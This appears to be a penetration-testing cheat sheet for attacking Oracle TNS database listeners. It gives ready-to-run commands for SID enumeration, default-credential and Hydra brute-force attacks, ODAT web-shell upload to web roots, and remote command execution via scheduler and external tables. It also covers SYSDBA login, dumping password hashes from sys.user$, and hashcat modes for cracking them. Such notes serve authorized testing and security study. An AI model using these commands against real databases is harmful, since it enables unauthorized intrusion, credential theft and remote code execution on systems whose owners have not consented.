# Oracle TNS
```table-of-contents
```
## Theory: SID vs Service Name
| **Term**       | **Description**                                 | **Importance**                                                               |
| -------------- | ----------------------------------------------- | ---------------------------------------------------------------------------- |
| `SID`          | System Identifier (e.g., `XE`, `ORCL`, `PDB1`). | Unique ID for the specific database instance. **Required** for legacy tools. |
| `Service Name` | Alias to one or more instances.                 | Used by modern clients. Often the same as SID.                               |
## Discovery & SID Enumeration
```shell
# Nmap - Detect Version
nmap -p 1521 -sV <IP>

# Nmap - Brute Force SIDs
# Uses a list of common SIDs (XE, ORCL, HR, etc.)
nmap -p 1521 --script oracle-sid-brute <IP>

# ODAT - SID Guesser (More robust)
# -s: Server IP
odat sidguesser -s <IP>
```
## Authentication & Brute Force
### Default Credentials
- `system : manager`
- `scott : tiger`
- `dbsnmp : dbsnmp`
- `sys : change_on_install`
### Automated Attacks
```shell
# ODAT - Password Guesser
# Tries valid SIDs with a list of default Oracle credentials
odat passwordguesser -s <IP> -d <SID>

# Hydra - Brute Force
# /XE is the SID found in the previous step
hydra -L users.txt -P passwords.txt oracle-listener://<IP>/XE
```
## ODAT (Oracle Database Attacking Tool)
```shell
# Check all available modules (Testing what we can do)
# -U: User | -P: Password | -d: SID
odat all -s <IP> -d <SID> -U <USER> -P <PASS>

# Upload a File (WebShell)
# Needs privileges (DBA or specific grants)
# Writes local file 'shell.aspx' to remote path 'C:\inetpub\wwwroot'
odat utlfile -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx

# Execute System Commands (RCE)
# Tries multiple techniques: Java, External Table, Scheduler
odat dbmsscheduler -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba --exec "whoami"
odat externaltable -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba --exec "whoami"
```
## Manual Interaction (SQLPlus)
### Installation (Quick Ref)
```shell
# Connect syntax: user/pass@IP/SID
sqlplus scott/tiger@<IP>/XE

# Connect as SYSDBA (God Mode)
sqlplus scott/tiger@<IP>/XE as sysdba
```
### Enumeration Commands (Inside SQL)
```sql
-- List all tables
SELECT table_name FROM all_tables;

-- Current User Privileges
SELECT * FROM user_role_privs;

-- List All Users
SELECT username FROM all_users;

-- Dump Hashes (Requires High Privs)
-- Sys.user$ contains the password hashes
SELECT name, password FROM sys.user$;
```
## Post-Exploitation
### File System Access
_If the DB runs as a high-privilege user (often SYSTEM on Windows), you can write files anywhere._

| **OS**      | **Common Web Root**      |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
| XAMPP   | `C:\xampp\htdocs`    |
### Hash Cracking
- **Hashcat Mode 3100:** Oracle 7-10g (DES)
- **Hashcat Mode 3200:** Oracle 11g (SHA1)
